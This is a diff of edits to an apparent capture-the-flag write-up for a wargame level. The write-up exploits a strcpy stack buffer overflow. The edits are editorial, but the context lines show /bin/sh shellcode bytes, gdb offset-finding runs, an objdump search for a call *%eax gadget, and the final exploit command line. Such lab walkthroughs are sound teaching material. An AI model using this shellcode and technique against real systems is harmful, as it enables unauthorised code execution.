@@ -15,7 +15,7 @@ int main(int argc, char **argv) {
 ```
 
 The problem is obvious:
-`strcpy` is well-known to be unsafe,
+`strcpy` is unsafe,
 as it doesn't check if the destination array has enough space to store the source array.
 We can overwrite the memory area beyond `buf` using a long command line argument.
 
@@ -56,9 +56,8 @@ After compiling the above program,
 there is more work to do,
 such as rewriting assembly instructions that use `NULL` values,
 as `strcpy` won't copy anything beyond the first `NULL`.
-
 For our purposes,
-we can take the finished shellcode from the Smash The Stack article[5],
+we can take the finished shellcode from the article,
 and for convenience, let's save it in a shell variable:
 ```
 EGG=$(printf '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')
@@ -96,7 +95,7 @@ Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1024 + "abcd
 Program received signal SIGSEGV, Segmentation fault.
 0x706f6e6d in ?? ()
 ```
-That looks within our `abc...` sequence.
+That looks within our "abc..." sequence.
 Let's check the ASCII codes to find the exact location:
 ```
 $ echo abcdefghijklmnopqrstuvwxyz | hexdump -C
@@ -116,7 +115,6 @@ Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1036 + "BBBB
 Program received signal SIGSEGV, Segmentation fault.
 0x42424242 in ?? ()
 ```
-Perfect.
 If we put the shellcode at the beginning of the buffer,
 then our input string will be in this form:
 ```
@@ -160,7 +158,6 @@ $ objdump -d /levels/level04/level04 | grep call.*eax
  80484cf:   ff d0                   call   *%eax
  80485fb:   ff d0                   call   *%eax
 ```
-Bingo!
 We can use either `0x080484cf` or `0x080485fb` as the address:
 ```
 $ /levels/level04/level04 $EGG$(python -c 'print "A" * 991')$(printf '\xcf\x84\x04\x08')
